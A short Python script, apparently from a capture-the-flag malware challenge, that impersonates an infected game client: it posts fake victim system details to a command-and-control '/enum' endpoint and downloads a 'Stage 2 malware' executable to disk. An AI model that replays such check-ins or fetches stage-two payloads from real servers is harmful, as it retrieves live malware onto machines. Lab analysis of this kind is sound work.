import requests

url = "http://154.57.164.73:32581" # REPLACE THIS with your instance IP and Port

# 1. Fake the data the game was supposed to collect
sys_info = {
    "os_name": "Windows",
    "processor_name": "Intel Core i7",
    "cpu_cores": 8,
    "is_64bit": True,
    "locale": "en_US",
    "user_dir": "C:/Users/Player/AppData/Roaming/Godot"
}

# Use a session so cookies from the first request carry over
session = requests.Session()

print("[*] Sending victim info to /enum...")
res1 = session.post(f"{url}/enum", json=sys_info)
print(f"[+] Server response: {res1.status_code}")

print("[*] Downloading the Stage 2 malware...")
res2 = session.get(f"{url}/p47l0ad_binary")

if res2.status_code == 200:
    with open("new_level_mod.exe", "wb") as f:
        f.write(res2.content)
    print("[+] Successfully saved 'new_level_mod.exe'!")
else:
    print(f"[-] Failed to download. Status: {res2.status_code}")